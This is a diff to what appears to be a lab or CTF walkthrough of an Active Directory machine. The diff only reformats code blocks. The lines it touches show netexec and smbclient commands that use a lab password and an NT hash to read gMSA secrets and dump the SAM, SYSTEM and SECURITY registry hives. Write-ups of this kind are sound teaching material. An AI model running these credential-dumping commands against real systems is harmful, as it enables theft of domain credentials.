@@ -346,8 +346,7 @@ nxc ldap 10.0.28.182 -u 'pebble' -p 'PebbleIs47!' --gmsa
 Using the \`backup_operator\` module in netexec to dump the SAM, SYSTEM, and SECURITY registry hives. The SYSTEM hive required a manual download from SYSVOL where the module saved it:
 \`\`\`bash
 nxc smb 10.0.28.182 -u 'svc_gmsa$' -H 085691c182d60ab1a12466ce7b50d29d -M backup_operator
-\`\`\`
-\`\`\`bash
+
 smbclient //10.0.28.182/SYSVOL -U 'svc_gmsa$' --pw-nt-hash 085691c182d60ab1a12466ce7b50d29d -c 'get SYSTEM'
 \`\`\`
 ![Downloading registry hives via Backup Operators privilege](/images/writeups/kitsune/18.png)
